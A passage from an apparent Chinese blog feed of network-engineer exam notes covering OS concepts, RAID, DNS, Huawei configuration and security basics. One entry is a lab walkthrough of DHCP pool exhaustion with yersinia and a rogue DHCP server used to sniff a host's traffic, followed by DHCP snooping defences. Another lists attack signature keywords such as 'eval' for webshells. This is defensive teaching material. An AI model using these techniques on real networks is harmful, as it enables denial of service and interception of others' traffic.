        <content type="html"><![CDATA[<h1 id="处理机管理"><a href="#处理机管理" class="headerlink" title="处理机管理"></a>处理机管理</h1><h2 id="进程和线程"><a href="#进程和线程" class="headerlink" title="进程和线程"></a>进程和线程</h2><p>程序：是指令的集合，静态的代码<br>进程：进程是正在运行的程序，是资源分配的最小单位。基本特性：动态性，并发性，独立性，异步性<br>线程：每一个任务就是一个线程，进程由一个或多个线程组成，线程之间共享进程资源，是CPU调度最小单位</p><p>进程的三种状态：运行，就绪，阻塞</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F231023.png"></p><p>运行：进程占用处理机，并运行<br>就绪：进程准备好运行条件，等待系统分配<br>阻塞：又称睡眠态，指进程没用准备好，等待某个事件完成</p><h2 id="进程同步和互斥"><a href="#进程同步和互斥" class="headerlink" title="进程同步和互斥"></a>进程同步和互斥</h2><p>同步：多个相互合作的进程在某些确定点上协调工作顺序过程，如进程B需要得到进程A的数据才能进行后续工作</p><p>互斥：各种进程可以共享，但是有些资源一次只能提供一个进程使用（如打印机），也称临界资源</p><h2 id="信号量机制和PV操作"><a href="#信号量机制和PV操作" class="headerlink" title="信号量机制和PV操作"></a>信号量机制和PV操作</h2><h4 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h4><p>信号量解决进程同步和互斥的工具</p><p>分两种：<br>公有信号量：实现进程间的互斥，初值等于1或资源数量<br>私有信号量：实现进程间的同步，初值等于0或正整数</p><p>信号量S&gt;&#x3D;0时，表示某资源的可用数量，S&lt;&#x3D;0时，表阻塞队列钟等待资源的进程数量</p><h4 id="PV操作"><a href="#PV操作" class="headerlink" title="PV操作"></a>PV操作</h4><p>PV操作用来实现进程同步和互斥，P操作表示申请一个资源，V操作表示释放一个资源</p><p>实现互斥的方法：<br>信号量设为1，当进程使用时执行P操作，释放资源时执行V操作</p><p>实现同步的方法：<br>将信号量S与消息关联，当S等于0时表示没用消息，当S不等于0表示有消息。<br>进程B调用P操作测试消息是否到达，进程A调用V操作通知消息已经准备好</p><p><strong>信号量取值范围 &#x3D; -(进程数量 - 可用资源数量) ~ 可用资源数量</strong></p><h2 id="进程死锁"><a href="#进程死锁" class="headerlink" title="进程死锁"></a>进程死锁</h2><p>当多个进程竞争使用资源时，资源已经全部被占用，于是没用任何一个进程能够继续运行，这种情况叫死锁</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F231023-1.png"></p><p>产生死锁的情况主要有：<br>    进程推荐顺序不当、同类资源分配不当、PV操作使用不当</p><p>死锁预防：<br>    打破互斥条件、打破不可抢占条件、打破占有且申请条件（保证至少有1个进程获取足够的资源）</p><p>不死锁公式：<br>    设m是资源数量，n是进程数量，w是每个进程需要的资源数量<br>    资源数量 &gt;&#x3D; 进程数量 * (每个进程需要的资源数量-1)+1<br>    m&#x3D;4，n&#x3D;3，w&#x3D;2，计算得到4&gt;&#x3D;4，不死锁<br>    m&#x3D;4，n&#x3D;3，w&#x3D;3，计算得到4&gt;&#x3D;7，死锁</p><h2 id="进程调度算法"><a href="#进程调度算法" class="headerlink" title="进程调度算法"></a>进程调度算法</h2><ol><li>先来先服务算法</li><li>优先数算法</li><li>时间片轮转算法</li><li>分级算法</li></ol><h1 id="存储管理"><a href="#存储管理" class="headerlink" title="存储管理"></a>存储管理</h1><h2 id="存储地址"><a href="#存储地址" class="headerlink" title="存储地址"></a>存储地址</h2><p>绝对地址<br>逻辑地址<br>地址重定位</p><p>计算寻址范围<br>若某计算机字长为32位，内存容量为2GB，按字节编址，则可寻址范围为512M</p><p>公式：容量&#x2F;字长&#x3D;2048MB&#x2F;（32&#x2F;8）Byte</p><h2 id="计算芯片需求量"><a href="#计算芯片需求量" class="headerlink" title="计算芯片需求量"></a>计算芯片需求量</h2><p>内存按字节编址，地址从90000H到CFFFFH，若用存储容量为16K*8bit的存储芯片构成该内存，需要的存储芯片为 16 片</p><p>地址数量：(CFFFFH - 90000H + 1) &#x3D; 40000H<br>转换成10进制：262144<br>转换成KB：262144 &#x2F; 1024 &#x3D; 256<br>芯片数量：256 &#x2F; 16 &#x3D; 16</p><h2 id="存储管理-1"><a href="#存储管理-1" class="headerlink" title="存储管理"></a>存储管理</h2><h3 id="分页存储："><a href="#分页存储：" class="headerlink" title="分页存储："></a>分页存储：</h3><p>将一个进程的地址空间划分成大小相同的块，称为页面<br>优点：页表是对程序员来说是透明的，地址变换快，调入操作简单<br>缺点：各页不是程序的独立模块，不便于实现程序和数据保护</p><h3 id="分段存储"><a href="#分段存储" class="headerlink" title="分段存储"></a>分段存储</h3><p>分段原理：地址空间被划分为可变长的块，称为段<br>优点是消除了内存零头，易于实现存储保护，便于程序动态装配<br>缺点是调入操作复杂，地址变换速度慢于页式存储管理</p><h3 id="虚拟存储"><a href="#虚拟存储" class="headerlink" title="虚拟存储"></a>虚拟存储</h3><p>虚拟存储是解决主存容量和存取速度矛盾的一种方法<br>原理是利用大容量的外存（通常是高速硬盘）来扩充内存，产生一个比物理内存空间大的多的逻辑虚拟内存空间，从而增强系统的处理能力</p><h2 id="作业管理"><a href="#作业管理" class="headerlink" title="作业管理"></a>作业管理</h2><p>作业是用户在一次上机过程中，要求计算机所做的工作的集合。</p><p>作业状态：<br>提交状态：用户向系统提交一个作业时<br>后背状态：用户作业等待进入内存时<br>执行状态<br>完成状态</p><h1 id="信息系统开发"><a href="#信息系统开发" class="headerlink" title="信息系统开发"></a>信息系统开发</h1><h2 id="软件生命周期"><a href="#软件生命周期" class="headerlink" title="软件生命周期"></a>软件生命周期</h2><p>计划 -&gt; 分析 -&gt; 设计 -&gt; 实现 -&gt; 测试 -&gt; 运维</p><h2 id="软件开发模型"><a href="#软件开发模型" class="headerlink" title="软件开发模型"></a>软件开发模型</h2><h4 id="瀑布模型："><a href="#瀑布模型：" class="headerlink" title="瀑布模型："></a>瀑布模型：</h4><p>明确了要求</p><h4 id="原型化模型："><a href="#原型化模型：" class="headerlink" title="原型化模型："></a>原型化模型：</h4><p>用户提出的问题进行总结，就需求达到一致意见，开发一个原型并运行。然后对原型进行反复修改完善。不适合大型系统。</p><h4 id="演化模型："><a href="#演化模型：" class="headerlink" title="演化模型："></a>演化模型：</h4><p>根据用户需求，快速分析构造该第一个初始版本，然后根据用户在使用过程中提出的建议进行改进，产生新的版本，重复这一过程，使用户最终获得满意的软件。</p><h4 id="增量模型："><a href="#增量模型：" class="headerlink" title="增量模型："></a>增量模型：</h4><p>整个软件产品被分解成若干个构件，开发人员逐个构件的交付产品。优点是适应变化，降低开发风险。</p><h4 id="螺旋模型："><a href="#螺旋模型：" class="headerlink" title="螺旋模型："></a>螺旋模型：</h4><p>综合了瀑布模型和演化模型的优点，增加了风险分析。适用于大型复杂的系统开发。优点是支持用户需注的动态变化，降低风险，缺点是增加开发成本。</p><h4 id="喷泉模型："><a href="#喷泉模型：" class="headerlink" title="喷泉模型："></a>喷泉模型：</h4><p>主要用于面向对象的开发过程，核心特点是迭代。所有开发活动没有明显边界，允许各种开发活动交叉进行。</p><h1 id="多路复用技术"><a href="#多路复用技术" class="headerlink" title="多路复用技术"></a>多路复用技术</h1><p>把多个低速信道组合一个高速信道的技术，使用多路器MUX进行多路复用和多路分配。</p><p>常见的五种如下：<br>频分多路复用<br>时分多路复用<br>波分多路复用<br>数字传输系统<br>同步数字系统</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F231026.png"></p><p>信道的有效带宽计算步骤：<br>传输数据的总带宽 &#x3D; 子信道数量 * 子信道带宽 * 子信道利用率<br>主线路的有效带宽 &#x3D; 传输数据的总带宽 &#x2F; 主线路信道利用率</p><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F231026-1.png"></p><h1 id="差错控制"><a href="#差错控制" class="headerlink" title="差错控制"></a>差错控制</h1><h2 id="海明码"><a href="#海明码" class="headerlink" title="海明码"></a>海明码</h2><p><img src="/../images/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F231026-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DHCP攻击及防御</title>
      <link href="/8db6.html"/>
      <url>/8db6.html</url>
      
        <content type="html"><![CDATA[<h1 id="DHCP原理"><a href="#DHCP原理" class="headerlink" title="DHCP原理"></a>DHCP原理</h1><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">工具：ensp，kali，yersinia，wireshark</span><br></pre></td></tr></table></figure><h1 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h1><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-1.png"></p><h2 id="配置DHCP服务器"><a href="#配置DHCP服务器" class="headerlink" title="配置DHCP服务器"></a>配置DHCP服务器</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[AR1]dhcp enable</span><br><span class="line">[AR1]ip pool a</span><br><span class="line">[AR1-ip-pool-a]dis th</span><br><span class="line">[V200R003C00]</span><br><span class="line">#</span><br><span class="line">ip pool a</span><br><span class="line"> gateway-list 192.168.1.1 </span><br><span class="line"> network 192.168.1.0 mask 255.255.255.0 </span><br><span class="line"> dns-list 8.8.8.8 </span><br><span class="line">#</span><br><span class="line">return</span><br><span class="line"></span><br><span class="line">[AR1-GigabitEthernet0/0/0]ip add 192.168.1.111 24</span><br><span class="line">[AR1-GigabitEthernet0/0/0]dhcp select global</span><br></pre></td></tr></table></figure><p>成功获取到地址</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-2.png"></p><p>查看DHCP服务的地址池状态</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-3.png"></p><h2 id="开始攻击"><a href="#开始攻击" class="headerlink" title="开始攻击"></a>开始攻击</h2><p>使用yersinia工具，对DHCP服务器进行攻击</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yersinia -G    //打开图形化页面</span><br></pre></td></tr></table></figure><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-4.png"></p><p>此时查看DHCP服务器的状态</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-5.png"></p><p>PC1重新获取地址已经失效，因为已经没有可以使用的地址了</p><h2 id="假冒DHCP进行监听"><a href="#假冒DHCP进行监听" class="headerlink" title="假冒DHCP进行监听"></a>假冒DHCP进行监听</h2><p>让kali冒充DHCP服务器给主机分配地址，注意需要将路由器的DHCP关闭之后才可以进行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW-GigabitEthernet0/0/1]shutdown</span><br></pre></td></tr></table></figure><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-6.png"></p><p>注意我们这里的Router要填写kali的IP地址才可以进行监听</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-7.png"></p><p>这里可以看出PC1获取地址的时候DHCP报文情况</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-8.png"></p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-9.png"></p><p>我们使用PC1进行<code>ping</code>命令<br>这里我们在kali中打开wireshark，监听eth0可以看到PC1的流量</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-10.png"></p><h2 id="防御技术"><a href="#防御技术" class="headerlink" title="防御技术"></a>防御技术</h2><p>构建一个IP-MAC-接口-Vlan的映射表，也就是DHCP Snooping技术。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW]dhcp enable</span><br><span class="line">[SW]dhcp snooping enable</span><br><span class="line">[SW]dhcp snooping enable vlan 1</span><br><span class="line">[SW-GigabitEthernet0/0/1]dhcp snooping trusted</span><br></pre></td></tr></table></figure><p>我们在kali上重新配置伪造的DHCP，这个时候没有显示任何的报文，PC1也获取不到了地址，成功防御了黑客的伪造DHCP</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-11.png"></p><p>这个时候把连接路由器的接口开起来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW-GigabitEthernet0/0/1]undo shutdown</span><br></pre></td></tr></table></figure><p>然后我们再次重新获取地址，发现已经成功获取到了正确的地址</p><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-12.png"></p><p>那么我们如何防御DHCP的DOS呢</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SW]dhcp snooping check dhcp-rate enable</span><br><span class="line">[SW]dhcp snooping check dhcp-rate 10    //这个命令确实可以起到限制的作用</span><br><span class="line">[SW-GigabitEthernet0/0/3]dhcp snooping check dhcp-rate enable</span><br><span class="line">[SW-GigabitEthernet0/0/3]dhcp snooping enable</span><br><span class="line">[SW-GigabitEthernet0/0/3]dhcp snooping check dhcp-chaddr enable</span><br></pre></td></tr></table></figure><p><img src="/../images/DHCP%E6%94%BB%E5%87%BB%E5%8F%8A%E9%98%B2%E5%BE%A1231021-13.png"></p><p>效果就是这样，地址虽然没用被占用完，但是其他机器ping不通了</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全专题</title>
      <link href="/3c4d.html"/>
      <url>/3c4d.html</url>
      
        <content type="html"><![CDATA[<h1 id="主动攻击与被动攻击"><a href="#主动攻击与被动攻击" class="headerlink" title="主动攻击与被动攻击"></a>主动攻击与被动攻击</h1><p>被动攻击：典型的是监听，最难被检测，重点是预防，主要手段是加密<br>主动攻击：假冒、重放、欺骗、消息篡改和拒绝服务，重点是检测而不是预防，手段有防火墙、IDS等技术</p><h1 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h1><p>对称加密算法（共享密钥加密算法）：加密和解密密钥相同<br>数据加密标准(DES)：一种分组密码，在加密前，先对整个明文进行分组。每一个分组为64位，之后进行16轮迭代，产生一组64位密文数据，使用的密钥是56位<br>3DES：使用两个密钥，执行三次DES算法，密钥长度是112位</p><hr><p>国际数据加密算法（IDEA）使用128位密钥，把明文分成64位的块，进行8轮迭代。IDEA可以使用硬件或软件实现，比DES快<br>高级加密标准（Advanced Encryption Standard，AES）AES支持128，192和256位三种密钥长度，可通过硬件实现<br>流加密算法RC4：加密速度快，可以达到DES 10倍</p><h1 id="公钥加密"><a href="#公钥加密" class="headerlink" title="公钥加密"></a>公钥加密</h1><p>每个实体有两个密钥：公钥公开，私钥自己保存</p><p>保密通信：公钥加密，私钥解密<br>数字签名：私钥加密，公钥解密</p><p>典型公钥加密算法：RSA</p><h1 id="哈希Hash（散列函数）MD5-SHA"><a href="#哈希Hash（散列函数）MD5-SHA" class="headerlink" title="哈希Hash（散列函数）MD5 SHA"></a>哈希Hash（散列函数）MD5 SHA</h1><p>MD5：128位<br>SHA：160位</p><p>不可逆性（单向）：几乎无法通过Hash结果推导出原文<br>无碰撞性：没用可能找到 Y 的hash值等于 X 的hash值<br>雪崩效应：输入轻微变化，Hash输出值产生巨大变化</p><p>MD5：报文按512位分组，最后得到128位报文摘要<br>SHA：对512位长的数据块进行复杂运行，最终产生160位散列值，比MD5更安全，但比MD5慢</p><h1 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h1><p>用于确认发送者身份和消息完整性</p><p>接收者能够核实发送者<br>发送者事后不能抵赖对报文的签名<br>接收者不能伪造对报文的签名</p><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98231018.png"></p><h1 id="数字证书"><a href="#数字证书" class="headerlink" title="数字证书"></a>数字证书</h1><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98231018-1.png"></p><h2 id="CA"><a href="#CA" class="headerlink" title="CA"></a>CA</h2><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98231018-2.png"></p><h1 id="PKI与Kerberos体系"><a href="#PKI与Kerberos体系" class="headerlink" title="PKI与Kerberos体系"></a>PKI与Kerberos体系</h1><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98231019.png"></p><h1 id="攻击特征码"><a href="#攻击特征码" class="headerlink" title="攻击特征码"></a>攻击特征码</h1><p>SQL注入攻击：select，create，user<br>跨站脚本攻击：script<br>木马：c&amp;c，trojan&#x2F;troy<br>一句话木马：eval</p><h1 id="常见病毒类型"><a href="#常见病毒类型" class="headerlink" title="常见病毒类型"></a>常见病毒类型</h1><table><thead><tr><th align="left"><div>病毒类型</div></th><th align="left">关键字</th><th align="left">特征</th><th align="left">代表</th></tr></thead><tbody><tr><td align="left">系统病毒</td><td align="left">前缀为win32，win95，PE，W32，W95等</td><td align="left">感染windows:系统的exe或dll文件，并通过这些文件进行传播</td><td align="left">CIH病毒</td></tr><tr><td align="left">蠕虫病毒</td><td align="left">前缀为worm</td><td align="left"><div>通过网络或者系统漏洞进行传播，可以向外发送带毒邮件或阻塞网络</div></td><td align="left">冲击波（阻塞网络）、小邮差病毒(发送带毒邮件)</td></tr><tr><td align="left">木马病毒和黑客病毒</td><td align="left">木马前缀为Trojan，黑客病毒前缀为Hack</td><td align="left">通过网络或漏洞进入系统并隐藏起来，木马负责入侵用户计算机，黑客通过木马进行远程控制</td><td align="left">游戏木马Trojan.Lmir.PSW60</td></tr><tr><td align="left">脚本病毒</td><td align="left">前缀是Script</td><td align="left">使用脚本语言编写，通过网页进行传播</td><td align="left">欢乐时光病VBS.Happtime<div>红色代码Script..Redlof<br></div></td></tr><tr><td align="left">宏病毒</td><td align="left">前缀是Macro</td><td align="left">特殊脚本病毒，感染word和excel</td><td align="left">Macro.Word97</td></tr><tr><td align="left">后门病毒</td><td align="left">前缀为Backdoor</td><td align="left">通过网络传播，给系统开后门，给用户计算机代理安全隐患</td><td align="left">入侵后添加隐藏账号</td></tr><tr><td align="left">破坏性程序病毒</td><td align="left">前缀为Harm</td><td align="left">本身具有好看的图标来诱感用户点击，当用户点击，对计算机产生破环</td><td align="left">熊猫烧香</td></tr><tr><td align="left">捆绑机病毒</td><td align="left">前缀为Binder</td><td align="left">将特定程序捆绑下载</td><td align="left">下载大礼包或某些软件捆绑病毒</td></tr></tbody></table><h1 id="等保"><a href="#等保" class="headerlink" title="等保"></a>等保</h1><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98231019-1.png"></p><h2 id="实际落地定级参照"><a href="#实际落地定级参照" class="headerlink" title="实际落地定级参照"></a>实际落地定级参照</h2><p>一级：适用于小型私营企业、中小学、一般乡镇所属信息系统、一般县级单位中的信息系统。</p><p>二级：适用于县级某些单位中的重要信息系统，地市级以上企事业单位内部的一般信息系统，如非涉及敏感信息的办公系统。（区县法院、医院）</p><p>三级：适用于地市级以上国家机关、企事业单位内部重要的信急系统，包括涉及工作秘密、商业秘密、敏感信息的办公系统和管理系统，以及全国联网运行的重要信息系统。（大部分定在三级）</p><p>四级：适用于国家重要领域、特别重要部门中的核心系统，如电力、电信、铁路、银行等，涉及国家安全和国计民生的核心系统。</p><p>五级：适用于国家重要领域、重要部门中的极端重要系统。</p><h2 id="等保标准变化"><a href="#等保标准变化" class="headerlink" title="等保标准变化"></a>等保标准变化</h2><p><img src="/../images/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98231019-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RAID技术专题</title>
      <link href="/7606.html"/>
      <url>/7606.html</url>
      
        <content type="html"><![CDATA[<p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018.png"></p><h1 id="raid0和raid1"><a href="#raid0和raid1" class="headerlink" title="raid0和raid1"></a>raid0和raid1</h1><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-1.png"></p><h1 id="raid3和raid5"><a href="#raid3和raid5" class="headerlink" title="raid3和raid5"></a>raid3和raid5</h1><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-2.png"></p><h1 id="raid6"><a href="#raid6" class="headerlink" title="raid6"></a>raid6</h1><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-3.png"></p><h1 id="raid10和raid50"><a href="#raid10和raid50" class="headerlink" title="raid10和raid50"></a>raid10和raid50</h1><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-4.png"></p><h1 id="常用raid技术对比"><a href="#常用raid技术对比" class="headerlink" title="常用raid技术对比"></a>常用raid技术对比</h1><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-5.png"></p><h1 id="常用raid典型应用场景"><a href="#常用raid典型应用场景" class="headerlink" title="常用raid典型应用场景"></a>常用raid典型应用场景</h1><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-6.png"></p><h1 id="raid2-0技术"><a href="#raid2-0技术" class="headerlink" title="raid2.0技术"></a>raid2.0技术</h1><p>解决传统raid重构速度慢，影响性能，传统raid受限于硬盘数量的问题</p><h2 id="raid2-0块虚拟化的发展"><a href="#raid2-0块虚拟化的发展" class="headerlink" title="raid2.0块虚拟化的发展"></a>raid2.0块虚拟化的发展</h2><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-7.png"></p><h2 id="两层虚拟化"><a href="#两层虚拟化" class="headerlink" title="两层虚拟化"></a>两层虚拟化</h2><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-8.png"></p><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-9.png"></p><p>快速精简重构，改善双盘失效率</p><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-10.png"></p><p>故障自检自愈，保证系统可靠性</p><p><img src="/../images/RAID%E6%8A%80%E6%9C%AF%E4%B8%93%E9%A2%98231018-11.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DNS域名系统</title>
      <link href="/f1ac.html"/>
      <url>/f1ac.html</url>
      
        <content type="html"><![CDATA[<h1 id="DNS域名系统"><a href="#DNS域名系统" class="headerlink" title="DNS域名系统"></a>DNS域名系统</h1><p>DNS基本作用：把域名转换成IP地址<br>DNS&#x2F;DHCP服务器必须为静态IP地址，而Web&#x2F;FTP均可为动态IP<br>Linux系统中提供DNS服务的组件为bind，主配置文件为named.conf<br>诊断域名系统基础结构的信息和查看DNS服务器的IP地址命令是：nslookup</p><h1 id="DNS域名结构"><a href="#DNS域名结构" class="headerlink" title="DNS域名结构"></a>DNS域名结构</h1><p><img src="/../images/DNS%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F231018.png"></p><h1 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h1><table><thead><tr><th align="left">记录类型</th><th align="left">说明</th><th align="left">备注</th></tr></thead><tbody><tr><td align="left">SOA</td><td align="left"><div>SOA叫起始授权机构记录，SOA记录用于在众多NS记</div><div>录中哪一台是主服务器<br></div></td><td align="left">SOA记录还设置一些数据版本和更新以及过期时间的信息</td></tr><tr><td align="left">A</td><td align="left">把主机名解析为P地址</td><td align="left">ww.test.com→1.1.1.1</td></tr><tr><td align="left">指针PTR</td><td align="left">反向查询，把P地解析为主机名</td><td align="left">1.1.1.1→ww.test.com</td></tr><tr><td align="left">名字服务器NS</td><td align="left">为一个域指定授权域名服务器，该域的所有子域也被委派给这个服务器</td><td align="left">比如某个区域由ns1.domain..com过行解析</td></tr><tr><td align="left">邮件服务器MX</td><td align="left">指明区域的邮件服务器及优先级</td><td align="left">建立电子邮箱服务，需要MX记录将指向邮件服务器地址</td></tr><tr><td align="left">别名CNAME</td><td align="left">指定主机名的别名<div>把主机名解析为另一个主机名</div></td><td align="left"><a href="http://www.test.com/">www.test.com</a><div>别名为webserver12.test.com</div></td></tr></tbody></table><h1 id="DNS查询过程"><a href="#DNS查询过程" class="headerlink" title="DNS查询过程"></a>DNS查询过程</h1><p><img src="/../images/DNS%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F231018-1.png"></p><p>递归查询：域名服务器帮助用户进行名字解析，并返回最后的结果<br>迭代查询：域名服务器进行迭代访问，反复多次，直到最后找到结果</p><p><img src="/../images/DNS%E5%9F%9F%E5%90%8D%E7%B3%BB%E7%BB%9F231018-2.png"></p>]]></content>
      
      
      <categories>
          
          <category> 软考网络工程师 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 软考网工 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为设备配置与命令</title>
      <link href="/b4ef.html"/>
      <url>/b4ef.html</url>
      
        <content type="html"><![CDATA[<h1 id="DHCP配置"><a href="#DHCP配置" class="headerlink" title="DHCP配置"></a>DHCP配置</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SwitchA] ip pool 1    //创建IP地址池1</span><br><span class="line">[SwitchA-ip-pool-1] network 10.1.1.0 mask 255.255.255.128    //配置地址池范围</span><br><span class="line">[SwitchA-ip-pool-1] dns-list 10.1.1.1    //配置DNS</span><br><span class="line">[SwitchA-ip-pool-1] gateway-list 10.1.1.1    //配置PC电脑网关</span><br><span class="line">[SwitchA-ip-pool-1] excluded-ip-address 10.1.1.2     //保留IP地址</span><br><span class="line">[SwitchA-ip-pool-1] lease 10    //配置租期，缺省为1天</span><br></pre></td></tr></table></figure><p>配置VLANIF10接口下的客户端从全局地址池中获取IP地址</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SwitchA] interface vlanif 10    //进入vlan10接口</span><br><span class="line">[SwitchA-Vlanif10] ip address 10.1.1.254 255.255.255.128    //配置vlan网关</span><br><span class="line">[SwitchA-Vlanif10] dhcp select global/interface    //全局或接口dhcp服务器</span><br></pre></td></tr></table></figure><h1 id="ACL分类"><a href="#ACL分类" class="headerlink" title="ACL分类"></a>ACL分类</h1><p>基于ACL规则定义方式的分类</p><table><thead><tr><th align="left">分类</th><th align="left">编号范围</th><th align="left">规则定义描述</th></tr></thead><tbody><tr><td align="left">基本ACL</td><td align="left">2000-2999</td><td align="left">仅使用报文的源IP地址、分片信息和生效时间段信息来定义规则</td></tr><tr><td align="left">高级ACL</td><td align="left">3000-3999</td><td align="left">可使用IPv4报文的源IP地址、目的IP地址、IP协议类型、ICMP类型、TCP源&#x2F;目的端口号、UDP源&#x2F;目的端口号、生效时间段等来定义规则</td></tr><tr><td align="left">二次ACL</td><td align="left">4000-4999</td><td align="left">使用报文的以太网帧头信息来定义规则，如根据源MAC地址，目的MAC地址，二层协议类型等</td></tr><tr><td align="left">用户自定义ACL</td><td align="left">5000-5999</td><td align="left">使用报文头、偏移位置、字符串掩码和用户自定义字符串来定义规则</td></tr><tr><td align="left">用户ACL</td><td align="left">6000-6999</td><td align="left">即可使用IPv4报文的源IP地址或源UCL（User Control List）组，也可使用目的IP地址或目的UCL组、IP协议类型、ICMP类型、TCP源端口&#x2F;目的端口、UDP源端口&#x2F;目的端口号等来定义规则</td></tr></tbody></table><p>基于ACL标识方法的分类</p><table><thead><tr><th align="left">分类</th><th align="left">规则定义描述</th></tr></thead><tbody><tr><td align="left">数字型ACL</td><td align="left">传统ACL标识方法。创建ACL时，指定一个唯一的数字标识该ACL</td></tr><tr><td align="left">命名型ACL</td><td align="left">通过名称代替编号来识别ACL</td></tr></tbody></table><h2 id="ACL匹配顺序及匹配结果"><a href="#ACL匹配顺序及匹配结果" class="headerlink" title="ACL匹配顺序及匹配结果"></a>ACL匹配顺序及匹配结果</h2><p>按照ACL规则编号从小到大的顺序进行匹配，编号越小越容易被匹配</p><p><img src="/../images/%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%91%BD%E4%BB%A4231019.png"></p><h2 id="入站-Inbound-及出站-outbound-方向"><a href="#入站-Inbound-及出站-outbound-方向" class="headerlink" title="入站(Inbound)及出站(outbound)方向"></a>入站(Inbound)及出站(outbound)方向</h2><p>入站先匹配，再路由<br>出站先路由，再匹配</p><p><img src="/../images/%E5%8D%8E%E4%B8%BA%E8%AE%BE%E5%A4%87%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%91%BD%E4%BB%A4231019-1.png"></p><h2 